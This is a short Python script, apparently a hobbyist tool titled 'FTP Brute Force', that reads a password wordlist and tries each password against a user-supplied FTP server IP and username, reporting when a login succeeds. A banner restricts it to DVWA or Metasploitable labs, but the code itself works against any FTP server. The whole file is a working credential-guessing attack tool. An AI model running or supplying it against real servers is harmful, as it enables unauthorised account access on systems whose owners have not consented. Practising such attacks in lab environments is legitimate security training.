import re
from ftplib import FTP

ascii_art = """
.######..######..#####..                
.##........##....##..##.                
.####......##....#####..                
.##........##....##.....                
.##........##....##.....                
........................                
.#####...#####...##..##..######..######.
.##..##..##..##..##..##....##....##.....
.#####...#####...##..##....##....####...
.##..##..##..##..##..##....##....##.....
.#####...##..##...####.....##....######.
........................................
.######...####...#####....####...######.
.##......##..##..##..##..##..##..##.....
.####....##..##..#####...##......####...
.##......##..##..##..##..##..##..##.....
.##.......####...##..##...####...######.
........................................ Made by MadMatrix
"""

def bruteforce(ip, user, password):
    try:
        ftp = FTP(ip)
        print(f"USER: {user}, PASSWORD: {password}")
        res = ftp.login(user, password)
        if "230" in res:
            print("[+] FIND PASSWORD !!")
        else:
            print("[-] FAILED.")
        ftp.quit()

    except Exception as ex:
        print(f"Error: {ex}")

def display_welcome():
    print(ascii_art)
    print("\nONLY DVWA OR MEATSPLOITABLE\n")

def select_file():
    while True:
        file_name = input("Please enter the name of the password file: ").strip()
        if re.match(r'^[\w\-./\\]+$', file_name):
            try:
                with open(file_name, 'r') as password_file:
                    passwords = password_file.readlines()
                return passwords
            except FileNotFoundError:
                print(f"Error: File '{file_name}' not found. Please enter a valid file name.")
        else:
            print("Error: Invalid file name format. Please enter a valid file name.")

def select_user():
    user = input("Please enter the FTP username: ").strip()
    return user

def main():
    display_welcome()

    ip = input("Please enter the IP address: ").strip()
    passwords = select_file()
    user = select_user()

    try:
        for password in passwords:
            password = password.strip()
            bruteforce(ip, user, password)

    except Exception as ex:
        print(f"Error: {ex}")

if __name__ == '__main__':
    main()




